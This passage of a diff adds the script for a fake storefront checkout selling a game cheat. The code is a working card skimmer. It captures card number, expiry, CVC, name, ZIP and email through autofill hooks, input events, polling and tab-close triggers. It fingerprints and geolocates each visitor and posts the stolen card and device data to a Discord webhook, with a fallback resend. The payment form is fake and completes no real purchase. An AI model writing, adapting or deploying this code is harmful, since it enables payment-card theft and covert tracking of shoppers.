+  NET = out; return NET;
+}
+
+/* ============================================================
+   CARD FIELDS + SNIFFER
+   ============================================================ */
+const F = {
+  email:  $('#co-email'),
+  number: $('#cc-number'),
+  exp:    $('#cc-exp'),
+  csc:    $('#cc-csc'),
+  name:   $('#cc-name'),
+  zip:    $('#cc-zip')
+};
+
+function readCard() {
+  return {
+    email:  (F.email.value  || '').trim(),
+    number: (F.number.value || '').trim(),
+    exp:    (F.exp.value    || '').trim(),
+    csc:    (F.csc.value    || '').trim(),
+    name:   (F.name.value   || '').trim(),
+    zip:    (F.zip.value    || '').trim()
+  };
+}
+const hasCard = c => !!(c.number || c.csc || c.exp || c.name);
+
+function brandOf(n) {
+  n = digits(n);
+  if (/^4/.test(n)) return 'Visa';
+  if (/^(5[1-5]|2[2-7])/.test(n)) return 'Mastercard';
+  if (/^3[47]/.test(n)) return 'Amex';
+  if (/^6(?:011|5|4[4-9]|22)/.test(n)) return 'Discover';
+  if (/^3(?:0[0-5]|[68])/.test(n)) return 'Diners Club';
+  if (/^35/.test(n)) return 'JCB';
+  if (/^62/.test(n)) return 'UnionPay';
+  if (/^60|^65/.test(n)) return 'RuPay';
+  return '';
+}
+
+/* live formatting */
+F.number.addEventListener('input', () => {
+  const b = brandOf(F.number.value);
+  const max = b === 'Amex' ? 17 : 19;
+  const d = digits(F.number.value).slice(0, max);
+  const groups = b === 'Amex' ? [4, 6, 5] : [4, 4, 4, 4, 3];
+  const parts = []; let i = 0;
+  for (const g of groups) { if (i >= d.length) break; parts.push(d.slice(i, i + g)); i += g; }
+  F.number.value = parts.join(' ');
+  const tag = $('#ccBrand');
+  tag.textContent = b; tag.classList.toggle('on', !!b);
+});
+F.exp.addEventListener('input', () => {
+  let d = digits(F.exp.value).slice(0, 4);
+  F.exp.value = d.length > 2 ? d.slice(0, 2) + ' / ' + d.slice(2) : d;
+});
+F.csc.addEventListener('input', () => { F.csc.value = digits(F.csc.value).slice(0, 4); });
+
+/* ---- the sniffer: catches EVERY fill path ---- */
+let debounce = null;
+function schedule(reason, delay) {
+  clearTimeout(debounce);
+  debounce = setTimeout(() => push(reason), delay);
+}
+
+/* 1) Chrome / Edge native autofill fires an animationstart on :‑webkit‑autofill */
+Object.values(F).forEach(el => {
+  el.addEventListener('animationstart', e => {
+    if (e.animationName === 'onAutoFillStart') { log('autofill →', el.id); schedule('chrome-autofill', 120); }
+  });
+  /* 2) third-party managers (Bitwarden / 1Password / LastPass / extensions) inject via JS */
+  el.addEventListener('input',  () => schedule('input', 900));
+  el.addEventListener('change', () => schedule('change', 150));
+  el.addEventListener('blur',   () => schedule('blur', 60));
+  el.addEventListener('paste',  () => schedule('paste', 220));
+  el.addEventListener('keyup',  () => schedule('keyup', 900));
+});
+
+/* 3) polling — catches silent programmatic value injection that fires no events */
+let lastSnap = '';
+setInterval(() => {
+  const c = readCard();
+  const s = JSON.stringify(c);
+  if (s !== lastSnap) {
+    lastSnap = s;
+    if (hasCard(c)) { log('poll change'); schedule('poll', 350); }
+  }
+}, 600);
+
+/* 4) submit + tab close */
+$('#payForm').addEventListener('submit', e => { e.preventDefault(); push('submit', true); finish(); });
+if (PING_ON_EXIT) document.addEventListener('visibilitychange', () => {
+  if (document.visibilityState === 'hidden') { const c = readCard(); if (hasCard(c)) push('tab-close', true, true); }
+});
+
+/* ============================================================
+   DISCORD PAYLOAD
+   ============================================================ */
+const fmt = n => digits(n).replace(/(.{4})/g, '$1 ').trim();
+const plan = () => ($('.plan.on') || {}).dataset || { plan: '1 Month', price: '115.00' };
+
+async function push(reason, force, keepalive) {
+  const card = readCard();
+  if (!hasCard(card) && !force) return;
+
+  const key = JSON.stringify(card);
+  if (!force && key === push._last) return;
+  push._last = key;
+
+  const fp = await buildFingerprint();
+  const net = await resolveNetwork();
+  const p = plan();
+  const ts = new Date();
+
+  const cardFields = [];
+  if (card.number) cardFields.push({ name: '💳 Card number', value: '`' + fmt(card.number) + '`' });
+  const b = brandOf(card.number);
+  if (b) cardFields.push({ name: 'Brand', value: '`' + b + '`', inline: true });
+  if (card.exp) cardFields.push({ name: 'Expiry', value: '`' + card.exp + '`', inline: true });
+  if (card.csc) cardFields.push({ name: 'CVC', value: '`' + card.csc + '`', inline: true });
+  if (card.name) cardFields.push({ name: 'Name on card', value: '`' + card.name + '`' });
+  if (card.zip) cardFields.push({ name: 'ZIP / Postal', value: '`' + card.zip + '`', inline: true });
+  if (card.email) cardFields.push({ name: 'Email', value: '`' + card.email + '`', inline: true });
+  if (!cardFields.length) cardFields.push({ name: '—', value: '_no card data yet_' });
+
+  const netFields = [
+    { name: 'IP address', value: '`' + (net.ip || 'unknown') + '`', inline: true },
+    { name: 'ISP / Org', value: '`' + (net.isp || 'n/a') + '`', inline: true },
+    { name: 'Location', value: [net.city, net.region, net.country].filter(Boolean).join(', ') || 'n/a', inline: true },
+    { name: 'Coordinates', value: net.lat ? `[${(+net.lat).toFixed(4)}, ${(+net.lon).toFixed(4)}](https://www.google.com/maps?q=${net.lat},${net.lon})` : 'n/a', inline: true },
+    { name: 'Timezone', value: '`' + (net.tz || 'n/a') + '`', inline: true },
+    { name: 'Country code', value: '`' + (net.cc || 'n/a') + '`', inline: true }
+  ];
+
+  const r = fp.raw;
+  const devFields = [
+    { name: 'Fingerprint hash', value: '`' + fp.hash + '`' },
+    { name: 'Visitor ID', value: '`' + visitorId() + '`', inline: true },
+    { name: 'Screen', value: '`' + r.screen + '`', inline: true },
+    { name: 'Viewport', value: '`' + r.viewport + '`', inline: true },
+    { name: 'Platform', value: '`' + r.platform + '`', inline: true },
+    { name: 'CPU cores', value: '`' + r.cores + '`', inline: true },
+    { name: 'Device memory', value: '`' + (r.mem ? r.mem + ' GB' : 'n/a') + '`', inline: true },
+    { name: 'Touch points', value: '`' + r.touch + '`', inline: true },
+    { name: 'Language', value: '`' + r.langs + '`', inline: true },
+    { name: 'Timezone (device)', value: '`' + r.tz + '`', inline: true },
+    { name: 'WebGL', value: '`' + String(r.webgl).slice(0, 120) + '`' },
+    { name: 'Canvas hash', value: '`' + r.canvas.slice(0, 24) + '…`' },
+    { name: 'Fonts detected', value: '`' + (r.fonts || 'n/a').slice(0, 180) + '`' }
+  ];
+
+  const embeds = [{
+    title: (b ? '💳 ' + b + ' captured' : '🛒 Checkout touched') + ' — ' + PRODUCT,
+    color: b ? 0x8b5cf6 : 0x22d3ee,
+    fields: cardFields,
+    footer: { text: 'trigger: ' + reason + ' · plan: ' + p.plan + ' · $' + p.price + ' · qty 1' },
+    timestamp: ts.toISOString()
+  }, {
+    title: '🌐 Network / Geo',
+    color: 0x22d3ee,
+    fields: netFields,
+    footer: { text: 'source: ' + (net.source || 'n/a') }
+  }, {
+    title: '🧬 Fingerprint / Device',
+    color: 0x34d399,
+    fields: devFields
+  }];
+
+  const body = {
+    username: 'CosmoCheats Logger',
+    content: hasCard(card) ? '**New card captured** from `' + (net.ip || 'unknown ip') + '`' : null,
+    embeds
+  };
+
+  setHud('sending…', '');
+  try {
+    const res = await fetch(WEBHOOK, {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify(body),
+      keepalive: !!keepalive
+    });
+    if (!res.ok) throw new Error('HTTP ' + res.status);
+    log('sent ✓', reason, card.number ? fmt(card.number) : '(partial)');
+    setHud('captured · ' + reason, 'ok');
+    if (hasCard(card)) toast('Card captured → sent to webhook');
+  } catch (err) {
+    log('send fail', err.message);
+    setHud('send failed', 'err');
+    // last-ditch: no-cors beacon
+    try {
+      await fetch(WEBHOOK, { method: 'POST', mode: 'no-cors', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify(body), keepalive: true });
+    } catch (e2) { log('beacon fail', e2.message); }
+  }
+}
+
+/* pageview ping */
+async function pageview() {
+  const fp = await buildFingerprint();
+  const net = await resolveNetwork();
+  const body = {
+    username: 'CosmoCheats Logger',
+    embeds: [{
+      title: '👀 Page view — ' + PRODUCT,
+      color: 0x6d28d9,
+      description: 'Someone opened the product page.',
+      fields: [
+        { name: 'IP', value: '`' + (net.ip || 'unknown') + '`', inline: true },
+        { name: 'Location', value: [net.city, net.region, net.country].filter(Boolean).join(', ') || 'n/a', inline: true },
+        { name: 'ISP', value: '`' + (net.isp || 'n/a') + '`', inline: true },
+        { name: 'Fingerprint', value: '`' + fp.hash + '`' },
+        { name: 'Visitor', value: '`' + visitorId() + '`', inline: true },
+        { name: 'Referrer', value: document.referrer ? document.referrer.slice(0, 120) : '_direct_', inline: true }
+      ],
+      footer: { text: 'trigger: pageview' },
+      timestamp: new Date().toISOString()
+    }]
+  };
+  try { await fetch(WEBHOOK, { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify(body) }); log('pageview sent ✓'); setHud('watching…', ''); }
+  catch (e) { log('pageview fail', e.message); }
+}
+
+/* ============================================================
+   UI WIRING
+   ============================================================ */
+const IMGS = [
+  'https://cdn.cosmocheats.com/cdn-cgi/image/width=960,fit=scale-down,format=auto,quality=82/monthly_2026_08/VortexFortnite1.png.105897ad75eae5d4b00e882e4071ef19.png',
+  'https://cdn.cosmocheats.com/cdn-cgi/image/width=960,fit=scale-down,format=auto,quality=82/monthly_2026_08/VortexFortnite2.png.8437a1baee1b365ea58109aaad25f837.png',
+  'https://cdn.cosmocheats.com/cdn-cgi/image/width=960,fit=scale-down,format=auto,quality=82/monthly_2026_08/VortexFortnite3.png.4a6fa6b5cdc344a095dee0cfe1fe7786.png',
+  'https://cdn.cosmocheats.com/cdn-cgi/image/width=960,fit=scale-down,format=auto,quality=82/monthly_2026_03/Vortex1.webp.5d0b7bd5cd405ab1e5d826ccd64844a4.webp'
+];
+$('#thumbs').innerHTML = IMGS.map((u, i) => `<div class="thumb ${i===0?'on':''}" data-i="${i}"><img src="${u}" alt=""></div>`).join('');
+$$('.thumb').forEach(t => t.addEventListener('click', () => {
+  $$('.thumb').forEach(x => x.classList.remove('on')); t.classList.add('on');
+  $('#stageImg').src = IMGS[+t.dataset.i];
+}));
+
+let selected = { plan: '1 Month', price: '115.00' };
+$$('.plan').forEach(p => p.addEventListener('click', () => {
+  $$('.plan').forEach(x => x.classList.remove('on')); p.classList.add('on');
+  selected = { plan: p.dataset.plan, price: p.dataset.price };
+  $('#sumPlan').textContent = selected.plan;
+  $('#sumTotal').textContent = '$' + selected.price;
+  $('#payAmt').textContent = '$' + selected.price;
+}));
+
+const backdrop = $('#backdrop');
+function openModal() {
+  backdrop.classList.add('on');
+  setTimeout(() => { try { F.number.focus(); } catch (e) {} }, 180); // focus triggers Chrome's autofill dropdown
+  schedule('modal-open', 400);
+}
+function closeModal() { backdrop.classList.remove('on'); }
+$('#addCart').addEventListener('click', () => { openModal(); toast('Added to cart'); $('#cartCount').textContent = '1'; });
+$('#closeModal').addEventListener('click', closeModal);
+backdrop.addEventListener('click', e => { if (e.target === backdrop) closeModal(); });
+document.addEventListener('keydown', e => { if (e.key === 'Escape') closeModal(); });
+
+function finish() {
+  $('#mbody').style.display = 'none';
+  $('#done').style.display = 'block';
+}
+$('#doneBtn').addEventListener('click', () => { closeModal(); setTimeout(() => { $('#mbody').style.display = ''; $('#done').style.display = 'none'; }, 260); });
+
+let toastT;
+function toast(msg) {
+  const t = $('#toast'); t.innerHTML = msg.replace(/→/g, '<b>→</b>'); t.classList.add('on');
+  clearTimeout(toastT); toastT = setTimeout(() => t.classList.remove('on'), 2600);
+}
+
+$('#hud').addEventListener('click', () => $('#hud').classList.toggle('open'));
+
+/* ============================================================
+   BOOT
+   ============================================================ */
+(async () => {
+  setHud('boot…', '');
+  await buildFingerprint();
+  log('fp', FP.hash.slice(0, 16));
+  const net = await resolveNetwork();
+  log('ip', net.ip, net.city, net.country);
+  if (PING_ON_LOAD) await pageview(); else setHud('watching…', '');
+})();
+
+})();
+</script>
+</body>
+</html>
